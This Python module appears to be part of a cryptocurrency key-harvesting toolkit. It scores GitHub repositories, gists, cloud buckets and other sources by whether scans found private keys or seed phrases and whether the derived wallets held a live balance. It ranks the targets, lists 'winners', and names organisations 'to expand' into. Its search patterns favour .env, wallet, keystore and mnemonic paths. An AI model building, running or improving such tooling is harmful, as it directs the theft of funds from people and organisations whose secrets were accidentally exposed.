#!/usr/bin/env python3
"""Production target intelligence — outcome-based only.

Scores come from REAL scanner outcomes:
  trufflehog/source → key derived → live RPC balance

Never uses demo main() fake updates. Never invents success rates.
"""
from __future__ import annotations

import hashlib
import json
import re
import sys
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

HOME = Path.home()
SCORES_FILE = HOME / ".target_scores.json"
PLATFORM_FILE = HOME / ".platform_stats.json"
OUTCOMES_FILE = HOME / ".scan_outcomes.jsonl"
PASTE_BOX = HOME / "paste_box.txt"
HOT_FILE = HOME / ".hot_targets.json"

BEGIN_MARKER = "# === BEGIN GENERATED TARGETS ==="
END_MARKER = "# === END GENERATED TARGETS ==="

FAKE_RE = re.compile(
    r"placeholder|example\.com|my-bucket|myuser|localhost|your[-_]|xxx|dummy|"
    r"public-dataset-placeholder|public-bucket-placeholder",
    re.I,
)

NOISE_URI_RE = re.compile(
    r"(build/contracts|contracts-foundry/out|node_modules|go\.sum|baselines/reference|"
    r"package-lock|yarn\.lock|mock|fixture|libsecp256k1)",
    re.I,
)
SIGNAL_URI_RE = re.compile(
    r"(\.env|secrets?|wallet|keystore|mnemonic|private|deploy|hardhat|scripts/upgrade|peggy)",
    re.I,
)

GITHUB_URL_RE = re.compile(
    r"https?://(?:www\.)?github\.com/([A-Za-z0-9_.-]+)/([A-Za-z0-9_.-]+)"
)


def utc_now() -> str:
    return datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")


def uri_hash(uri: str) -> str:
    return hashlib.sha256(uri.encode("utf-8", errors="ignore")).hexdigest()[:16]


def is_fake(uri: str) -> bool:
    return (not uri) or bool(FAKE_RE.search(uri))


def detect_platform(uri: str) -> str:
    u = (uri or "").lower()
    if "github.com" in u or u.startswith("gh://"):
        return "github"
    if "gitlab.com" in u:
        return "gitlab"
    if "huggingface.co" in u or "hf.co" in u:
        return "huggingface"
    if "gist.github.com" in u:
        return "gist"
    if "docker" in u:
        return "docker"
    if u.startswith("s3://") or "amazonaws.com" in u:
        return "aws_s3"
    if u.startswith("gs://") or "storage.googleapis.com" in u:
        return "gcs"
    return "unknown"


class TargetIntelligence:
    def __init__(self) -> None:
        self.home = HOME
        self.target_scores_file = SCORES_FILE
        self.platform_stats_file = PLATFORM_FILE
        self.load_target_scores()
        self.load_platform_stats()

    def load_target_scores(self) -> None:
        try:
            self.target_scores = json.loads(self.target_scores_file.read_text(encoding="utf-8"))
        except Exception:
            self.target_scores = {}

    def save_target_scores(self) -> None:
        self.target_scores_file.write_text(
            json.dumps(self.target_scores, indent=2, sort_keys=True), encoding="utf-8"
        )

    def load_platform_stats(self) -> None:
        try:
            self.platform_stats = json.loads(self.platform_stats_file.read_text(encoding="utf-8"))
        except Exception:
            self.platform_stats = {}
        # Ensure counters exist — zeros mean "no evidence yet", not fake priors
        for p in (
            "github", "gitlab", "huggingface", "docker", "gist",
            "aws_s3", "gcs", "circleci", "postman", "jenkins",
            "elasticsearch", "syslog", "unknown",
        ):
            st = self.platform_stats.setdefault(p, {})
            st.setdefault("scans", 0)
            st.setdefault("key_hits", 0)
            st.setdefault("balance_hits", 0)
            st.setdefault("empty_scans", 0)
            # success_rate ONLY from real counters
            scans = max(int(st.get("scans") or 0), 0)
            keys = int(st.get("key_hits") or 0)
            bals = int(st.get("balance_hits") or 0)
            if scans > 0:
                st["success_rate"] = (keys + 2.0 * bals) / float(scans)
            else:
                st["success_rate"] = 0.0
                st["last_checked"] = st.get("last_checked")

    def save_platform_stats(self) -> None:
        self.platform_stats_file.write_text(
            json.dumps(self.platform_stats, indent=2, sort_keys=True), encoding="utf-8"
        )

    def _ensure_target(self, uri: str, platform: Optional[str] = None) -> dict:
        h = uri_hash(uri)
        row = self.target_scores.get(h)
        if not row:
            row = {
                "uri": uri,
                "platform": platform or detect_platform(uri),
                "score": 0.0,
                "scans": 0,
                "key_hits": 0,
                "balance_hits": 0,
                "empty_scans": 0,
                "last_updated": utc_now(),
                "last_outcome": None,
            }
            self.target_scores[h] = row
        else:
            row.setdefault("uri", uri)
            row.setdefault("platform", platform or detect_platform(uri))
            row.setdefault("scans", 0)
            row.setdefault("key_hits", 0)
            row.setdefault("balance_hits", 0)
            row.setdefault("empty_scans", 0)
        return row

    def _recompute_score(self, row: dict) -> float:
        """Score from outcomes only."""
        keys = int(row.get("key_hits") or 0)
        bals = int(row.get("balance_hits") or 0)
        empty = int(row.get("empty_scans") or 0)
        scans = max(int(row.get("scans") or 0), 1)
        # Bayesian-ish: balance hits dominate, then keys, empty penalizes
        score = (3.0 * bals + 1.5 * keys) / scans
        score -= 0.15 * min(empty, 10)
        # small platform prior from REAL platform rate only
        plat = row.get("platform") or "unknown"
        pr = float(self.platform_stats.get(plat, {}).get("success_rate") or 0.0)
        score += 0.25 * pr
        # keyword bonus is tiny and only additive after real signal exists
        uri_l = (row.get("uri") or "").lower()
        if keys + bals > 0:
            for kw in ("wallet", "crypto", "bitcoin", "ethereum", "mnemonic", "keystore", "web3",
                       "hardhat", "peggy", "bridge", "deploy", ".env", "secret"):
                if kw in uri_l:
                    score += 0.03
        # Demote bytecode/lockfile noise; promote secret-path URIs
        if NOISE_URI_RE.search(uri_l) and bals == 0:
            score *= 0.35
        if SIGNAL_URI_RE.search(uri_l):
            score += 0.08
        if plat == "filesystem" and bals == 0 and keys > 0:
            score *= 0.85
        if plat == "github" and bals > 0:
            score += 0.5
        row["score"] = max(score, 0.0)
        return row["score"]

    def record_outcome(
        self,
        uri: str,
        *,
        platform: Optional[str] = None,
        has_key: bool = False,
        has_balance: bool = False,
        balance_total: float = 0.0,
        finding_types: Optional[List[str]] = None,
        meta: Optional[dict] = None,
    ) -> float:
        """Record one real scan outcome. Returns updated score."""
        if not uri or is_fake(uri):
            return 0.0
        platform = platform or detect_platform(uri)
        row = self._ensure_target(uri, platform)
        row["scans"] = int(row.get("scans") or 0) + 1
        outcome = "empty"
        if has_balance:
            row["balance_hits"] = int(row.get("balance_hits") or 0) + 1
            outcome = "balance"
        elif has_key:
            row["key_hits"] = int(row.get("key_hits") or 0) + 1
            outcome = "key"
        else:
            row["empty_scans"] = int(row.get("empty_scans") or 0) + 1
        row["last_outcome"] = outcome
        row["last_updated"] = utc_now()
        if finding_types:
            row["last_finding_types"] = list(finding_types)[:12]
        if balance_total:
            row["last_balance_total"] = float(balance_total)

        # platform counters
        st = self.platform_stats.setdefault(platform, {
            "scans": 0, "key_hits": 0, "balance_hits": 0, "empty_scans": 0, "success_rate": 0.0
        })
        st["scans"] = int(st.get("scans") or 0) + 1
        if has_balance:
            st["balance_hits"] = int(st.get("balance_hits") or 0) + 1
        elif has_key:
            st["key_hits"] = int(st.get("key_hits") or 0) + 1
        else:
            st["empty_scans"] = int(st.get("empty_scans") or 0) + 1
        scans = max(int(st["scans"]), 1)
        st["success_rate"] = (
            int(st.get("key_hits") or 0) + 2.0 * int(st.get("balance_hits") or 0)
        ) / float(scans)
        st["last_checked"] = utc_now()

        score = self._recompute_score(row)

        # append immutable outcome log
        try:
            ev = {
                "ts": utc_now(),
                "uri": uri,
                "platform": platform,
                "has_key": has_key,
                "has_balance": has_balance,
                "balance_total": balance_total,
                "finding_types": finding_types or [],
                "score": score,
                "meta": meta or {},
            }
            with OUTCOMES_FILE.open("a", encoding="utf-8") as f:
                f.write(json.dumps(ev) + "\n")
        except Exception:
            pass

        self.save_target_scores()
        self.save_platform_stats()
        return score

    # Back-compat name used by older code — maps to real outcome
    def update_success_rate(self, platform: str, success: bool) -> None:
        """Deprecated path: treat as platform-level empty/key without URI."""
        st = self.platform_stats.setdefault(platform, {
            "scans": 0, "key_hits": 0, "balance_hits": 0, "empty_scans": 0, "success_rate": 0.0
        })
        st["scans"] = int(st.get("scans") or 0) + 1
        if success:
            st["key_hits"] = int(st.get("key_hits") or 0) + 1
        else:
            st["empty_scans"] = int(st.get("empty_scans") or 0) + 1
        scans = max(int(st["scans"]), 1)
        st["success_rate"] = (
            int(st.get("key_hits") or 0) + 2.0 * int(st.get("balance_hits") or 0)
        ) / float(scans)
        st["last_checked"] = utc_now()
        self.save_platform_stats()

    def calculate_target_score(self, target: str, platform: str) -> float:
        if is_fake(target):
            return -1.0
        row = self._ensure_target(target, platform)
        # If never scanned, use platform empirical rate only (0 if unknown)
        if int(row.get("scans") or 0) == 0:
            pr = float(self.platform_stats.get(platform, {}).get("success_rate") or 0.0)
            # tiny crypto-path prior ONLY as tie-breaker among unscanned
            bonus = 0.0
            tl = target.lower()
            for kw in ("wallet", "keystore", "mnemonic", "secret", ".env"):
                if kw in tl:
                    bonus += 0.01
            row["score"] = pr + bonus
            row["last_updated"] = utc_now()
            return row["score"]
        return self._recompute_score(row)

    def prioritize_targets(
        self, targets: List[Tuple[str, str]]
    ) -> List[Tuple[str, float]]:
        scored = []
        for target, platform in targets:
            if is_fake(target):
                continue
            scored.append((target, self.calculate_target_score(target, platform)))
        scored.sort(key=lambda x: x[1], reverse=True)
        self.save_target_scores()
        self.save_platform_stats()
        return scored

    def reorder_paste_box(self) -> int:
        """Reorder GENERATED block in paste_box by live scores. Drop fakes."""
        if not PASTE_BOX.exists():
            return 0
        text = PASTE_BOX.read_text(encoding="utf-8", errors="ignore")
        lines = text.splitlines()
        begin = end = None
        for i, ln in enumerate(lines):
            if ln.strip() == BEGIN_MARKER:
                begin = i
            elif ln.strip() == END_MARKER and begin is not None:
                end = i
                break
        if begin is None or end is None:
            return 0

        body = lines[begin + 1 : end]
        entries: List[Tuple[str, str]] = []
        current_platform = "unknown"
        for ln in body:
            s = ln.strip()
            if not s:
                continue
            if s.startswith("# ---") and ":" in s:
                # "# --- github: 12 targets ---"
                try:
                    current_platform = s.split("---")[1].split(":")[0].strip()
                except Exception:
                    current_platform = "unknown"
                continue
            if s.startswith("#"):
                continue
            if is_fake(s):
                continue
            entries.append((s, current_platform or detect_platform(s)))

        prioritized = self.prioritize_targets(entries)
        # rebuild block
        by_p: Dict[str, List[str]] = {}
        scores_map = {u: sc for u, sc in prioritized}
        for uri, _sc in prioritized:
            p = detect_platform(uri)
            by_p.setdefault(p, []).append(uri)

        block = [
            BEGIN_MARKER,
            f"# LIVE prioritized @ {utc_now()} (outcome-scored, fakes purged)",
            f"# {len(prioritized)} targets",
        ]
        for p in sorted(by_p.keys(), key=lambda k: -len(by_p[k])):
            uris = by_p[p]
            block.append(f"# --- {p}: {len(uris)} targets ---")
            # keep score order within platform
            uris_sorted = sorted(uris, key=lambda u: -scores_map.get(u, 0))
            block.extend(uris_sorted)
        block.append(END_MARKER)

        new_lines = lines[:begin] + block + lines[end + 1 :]
        PASTE_BOX.write_text("\n".join(new_lines) + "\n", encoding="utf-8")
        return len(prioritized)

    def winning_orgs(self, min_key_hits: int = 1) -> List[str]:
        orgs = []
        for row in self.target_scores.values():
            if int(row.get("key_hits") or 0) + int(row.get("balance_hits") or 0) < min_key_hits:
                continue
            m = GITHUB_URL_RE.search(row.get("uri") or "")
            if m:
                orgs.append(m.group(1))
        return sorted(set(orgs))


def record_outcome_from_scanner(record: dict) -> float:
    """Helper for crypto_scanner: ingest a memory record."""
    ti = TargetIntelligence()
    uri = record.get("source_uri") or record.get("source") or ""
    if not uri:
        # try extract from source_line / raw
        blob = " ".join(
            str(record.get(k) or "")
            for k in ("source_line", "source", "repo", "url")
        )
        m = GITHUB_URL_RE.search(blob)
        if m:
            uri = f"https://github.com/{m.group(1)}/{m.group(2)}"
    if not uri:
        return 0.0
    findings = record.get("findings") or {}
    wallet = findings.get("wallet") or {}
    has_key = bool(
        wallet.get("wifs")
        or wallet.get("hex_keys")
        or wallet.get("seed_phrases")
        or findings.get("wif")
        or findings.get("hex_key")
        or findings.get("seed_phrase")
    )
    # balance info if attached
    bal = record.get("balance_total")
    has_balance = bool(record.get("has_balance")) or (
        isinstance(bal, (int, float)) and bal > 1e-12
    )
    types = []
    for k, v in findings.items():
        if v and k not in ("high_entropy", "base58_strings", "base64_strings", "derived_addresses", "wallet", "confidence", "correlated"):
            types.append(k)
    return ti.record_outcome(
        uri,
        platform=record.get("platform"),
        has_key=has_key,
        has_balance=has_balance,
        balance_total=float(bal or 0),
        finding_types=types,
        meta={"ts": record.get("ts")},
    )


def main() -> int:
    """Production CLI: reorder paste_box by real scores; print top winners."""
    ti = TargetIntelligence()
    n = ti.reorder_paste_box()
    print(f"[+] Prioritized {n} real targets in paste_box.txt")
    print("[+] Platform empirical rates (0 = no evidence yet):")
    for p, st in sorted(ti.platform_stats.items()):
        scans = int(st.get("scans") or 0)
        if scans == 0 and float(st.get("success_rate") or 0) == 0:
            continue
        print(
            f"  {p:15} scans={scans:4d} keys={int(st.get('key_hits') or 0):3d} "
            f"bal={int(st.get('balance_hits') or 0):3d} rate={float(st.get('success_rate') or 0):.4f}"
        )
    winners = [
        row for row in ti.target_scores.values()
        if int(row.get("key_hits") or 0) + int(row.get("balance_hits") or 0) > 0
    ]
    winners.sort(key=lambda r: -float(r.get("score") or 0))
    if winners:
        print("[+] Sources with real key/balance outcomes:")
        for row in winners[:15]:
            print(
                f"  {float(row.get('score') or 0):.3f}  keys={row.get('key_hits')} "
                f"bal={row.get('balance_hits')}  {row.get('uri')}"
            )
    else:
        print("[*] No key/balance outcomes recorded yet — rates stay 0 until scanner attributes sources.")
    orgs = ti.winning_orgs()
    if orgs:
        print(f"[+] Winning orgs to expand: {', '.join(orgs[:20])}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
